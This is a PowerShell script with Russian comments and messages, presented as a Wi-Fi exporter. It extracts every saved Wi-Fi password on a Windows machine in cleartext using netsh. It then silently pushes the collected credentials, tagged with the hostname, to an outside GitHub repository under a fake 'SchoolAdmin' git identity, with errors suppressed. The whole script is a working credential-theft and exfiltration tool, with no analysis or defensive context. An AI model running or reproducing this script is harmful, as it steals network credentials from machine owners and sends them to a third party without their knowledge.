# Универсальный WiFi Exporter (Win10 + Win11)

$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host "❌ Запусти от имени администратора!" -ForegroundColor Red
    exit
}

$RepoUrl = "https://github.com/DilanBlue/wifi.git"
$Token    = $env:GH_TOKEN

if (-not $Token) {
    Write-Host "❌ Токен не найден!" -ForegroundColor Red
    exit
}

$exportDir = "C:\WiFiExport"
$hostname = $env:COMPUTERNAME
$timestamp = Get-Date -Format "yyyy-MM-dd_HH-mm"
$filePath = Join-Path $exportDir "${hostname}_${timestamp}.txt"

New-Item -ItemType Directory -Force -Path $exportDir | Out-Null

$old = [Console]::OutputEncoding
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8

$profilesOutput = netsh wlan show profiles
$profiles = $profilesOutput | Select-String ':\s+(.+?)\s*$' | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }

$results = @()
$found = 0

foreach ($p in $profiles) {
    if (-not $p) { continue }
    
    $info = netsh wlan show profile name="$p" key=clear
    $pass = "НЕ НАЙДЕН"
    
    $line = $info | Select-String "Содержимое ключа|Key Content|╨б╨╛╨┤╨╡╤А╨╢╨╕╨╝╨╛╨╡"
    if ($line) {
        $pass = ($line -split "[:]", 2)[1].Trim()
        if ($pass.Length -gt 3) { $found++ }
    }
    
    $results += "SSID     : $p"
    $results += "Пароль   : $pass"
    $results += "----------------------------------------"
}

[Console]::OutputEncoding = $old

$header = @"
WiFi пароли с ноутбука: $hostname
Дата: $(Get-Date)
Windows: $((Get-WmiObject -Class Win32_OperatingSystem).Caption)
Найдено сетей: $($profiles.Count)
Извлечено паролей: $found
========================================
"@

$header + ($results -join "`n") | Out-File -Encoding UTF8 $filePath

Write-Host "✅ Готово! $found паролей извлечено" -ForegroundColor Green

$repoDir = Join-Path $exportDir "repo"
if (!(Test-Path $repoDir)) { git clone $RepoUrl $repoDir }

Copy-Item $filePath $repoDir -Force

Push-Location $repoDir
git config user.name "SchoolAdmin"
git config user.email "admin@school.local"
git add "*.txt"
git commit -m "WiFi from $hostname - $timestamp" 2>$null
git push "https://$Token@github.com/DilanBlue/wifi.git" main 2>$null
Pop-Location

Write-Host "✅ Успешно загружено на GitHub!" -ForegroundColor Green
